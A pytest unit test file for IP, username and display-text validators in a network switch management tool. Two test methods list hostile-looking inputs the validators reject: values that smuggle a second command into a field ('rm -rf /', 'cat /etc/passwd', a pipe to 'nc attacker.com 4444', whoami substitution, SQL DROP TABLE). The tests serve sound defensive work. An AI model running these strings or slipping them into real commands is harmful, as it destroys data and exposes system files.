"""Unit tests for validation utilities."""

import pytest

from switch_manager.utils.validation import (
    validate_ip,
    validate_username,
    sanitize_for_display
)


class TestValidateIP:
    """Test IP address validation."""

    def test_valid_ipv4_addresses(self) -> None:
        """Test valid IPv4 addresses."""
        valid_ips = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "8.8.8.8",
            "0.0.0.0",
            "255.255.255.255",
            "127.0.0.1",
        ]
        for ip in valid_ips:
            assert validate_ip(ip), f"Expected {ip} to be valid"

    def test_valid_ipv4_with_whitespace(self) -> None:
        """Test valid IPv4 with surrounding whitespace."""
        assert validate_ip(" 192.168.1.1 ")
        assert validate_ip("\t10.0.0.1\n")
        assert validate_ip("  8.8.8.8  ")

    def test_valid_ipv6_addresses(self) -> None:
        """Test valid IPv6 addresses."""
        valid_ips = [
            "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
            "2001:db8::1",
            "::1",
            "fe80::1",
            "::",
        ]
        for ip in valid_ips:
            assert validate_ip(ip), f"Expected {ip} to be valid"

    def test_invalid_ipv4_addresses(self) -> None:
        """Test invalid IPv4 addresses."""
        invalid_ips = [
            "999.999.999.999",
            "192.168.1.256",
            "192.168.1",
            "192.168.1.1.1",
            "192.168.-1.1",
            "192.168.1.a",
        ]
        for ip in invalid_ips:
            assert not validate_ip(ip), f"Expected {ip} to be invalid"

    def test_command_injection_attempts(self) -> None:
        """Test that command injection attempts are rejected."""
        malicious_inputs = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && cat /etc/passwd",
            "192.168.1.1 | nc attacker.com 4444",
            "192.168.1.1`whoami`",
            "192.168.1.1$(whoami)",
            "'; DROP TABLE switches; --",
        ]
        for malicious in malicious_inputs:
            assert not validate_ip(malicious), f"Expected {malicious} to be rejected"

    def test_empty_and_whitespace_strings(self) -> None:
        """Test empty and whitespace-only strings."""
        assert not validate_ip("")
        assert not validate_ip(" ")
        assert not validate_ip("   ")
        assert not validate_ip("\t")
        assert not validate_ip("\n")

    def test_special_characters(self) -> None:
        """Test strings with special characters."""
        assert not validate_ip("192.168.1.1/24")
        assert not validate_ip("192.168.1.1:8080")
        assert not validate_ip("http://192.168.1.1")

    def test_hostname_rejected(self) -> None:
        """Test that hostnames are rejected (not IP addresses)."""
        assert not validate_ip("localhost")
        assert not validate_ip("example.com")
        assert not validate_ip("switch001.local")


class TestValidateUsername:
    """Test username validation."""

    def test_valid_usernames(self) -> None:
        """Test valid usernames."""
        valid_usernames = [
            "admin",
            "root",
            "user123",
            "john.doe",
            "jane-smith",
            "test_user",
            "user.name_123-test",
            "a",
            "ABC123",
        ]
        for username in valid_usernames:
            assert validate_username(username), f"Expected {username} to be valid"

    def test_valid_username_with_whitespace(self) -> None:
        """Test valid username with surrounding whitespace."""
        assert validate_username(" admin ")
        assert validate_username("\tjohn.doe\n")
        assert validate_username("  root  ")

    def test_invalid_usernames_with_spaces(self) -> None:
        """Test that usernames with spaces are rejected."""
        assert not validate_username("john doe")
        assert not validate_username("user name")
        assert not validate_username("test user")

    def test_command_injection_attempts(self) -> None:
        """Test that command injection attempts are rejected."""
        malicious_inputs = [
            "admin; rm -rf /",
            "root && cat /etc/passwd",
            "user | nc attacker.com 4444",
            "test`whoami`",
            "user$(whoami)",
            "'; DROP TABLE users; --",
            "admin;whoami",
            "user&& ls",
            "test||echo",
        ]
        for malicious in malicious_inputs:
            assert not validate_username(malicious), f"Expected {malicious} to be rejected"

    def test_invalid_special_characters(self) -> None:
        """Test usernames with invalid special characters."""
        invalid_usernames = [
            "user@host",
            "admin#123",
            "user$name",
            "test%user",
            "user^name",
            "test&user",
            "user*name",
            "test(user)",
            "user[name]",
            "test{user}",
            "user\\name",
            "test/user",
            "user<name>",
            "test?user",
            "user!name",
            "test~user",
            "user`name",
            "test'user",
            'user"name',
        ]
        for username in invalid_usernames:
            assert not validate_username(username), f"Expected {username} to be rejected"

    def test_empty_and_whitespace_strings(self) -> None:
        """Test empty and whitespace-only strings."""
        assert not validate_username("")
        assert not validate_username(" ")
        assert not validate_username("   ")
        assert not validate_username("\t")
        assert not validate_username("\n")

    def test_username_length_boundaries(self) -> None:
        """Test username length boundaries."""
        # Single character should be valid
        assert validate_username("a")

        # Very long username (still valid if only allowed chars)
        long_username = "a" * 100
        assert validate_username(long_username)

        # Empty should be invalid
        assert not validate_username("")


class TestSanitizeForDisplay:
    """Test text sanitization for display."""

    def test_normal_text(self) -> None:
        """Test sanitizing normal text."""
        text = "Normal text"
        assert sanitize_for_display(text) == "Normal text"

    def test_text_with_newlines(self) -> None:
        """Test text with newlines (should be preserved)."""
        text = "Line 1\nLine 2"
        assert sanitize_for_display(text) == "Line 1\nLine 2"

    def test_text_with_tabs(self) -> None:
        """Test text with tabs (should be preserved)."""
        text = "Column1\tColumn2"
        assert sanitize_for_display(text) == "Column1\tColumn2"

    def test_text_with_control_characters(self) -> None:
        """Test text with control characters (should be removed)."""
        # Control characters like \x00, \x01, etc. should be removed
        text = "Hello\x00World\x01Test"
        result = sanitize_for_display(text)
        assert "\x00" not in result
        assert "\x01" not in result
        assert "HelloWorldTest" == result

    def test_text_truncation(self) -> None:
        """Test text truncation at max_length."""
        long_text = "a" * 200
        result = sanitize_for_display(long_text, max_length=50)
        assert len(result) == 53  # 50 + "..."
        assert result.endswith("...")

    def test_text_exactly_at_max_length(self) -> None:
        """Test text exactly at max_length (no truncation)."""
        text = "a" * 100
        result = sanitize_for_display(text, max_length=100)
        assert result == text
        assert not result.endswith("...")

    def test_empty_string(self) -> None:
        """Test empty string."""
        assert sanitize_for_display("") == ""

    def test_none_input(self) -> None:
        """Test None input."""
        assert sanitize_for_display(None) == ""  # type: ignore

    def test_whitespace_only(self) -> None:
        """Test whitespace-only string."""
        assert sanitize_for_display("   ") == "   "
        assert sanitize_for_display("\t\n") == "\t\n"

    def test_custom_max_length(self) -> None:
        """Test custom max_length parameter."""
        text = "a" * 50
        result = sanitize_for_display(text, max_length=10)
        assert len(result) == 13  # 10 + "..."
        assert result == "a" * 10 + "..."

    def test_text_with_emojis(self) -> None:
        """Test text with emoji characters (printable)."""
        text = "Hello 👋 World 🌍"
        result = sanitize_for_display(text)
        assert "👋" in result
        assert "🌍" in result
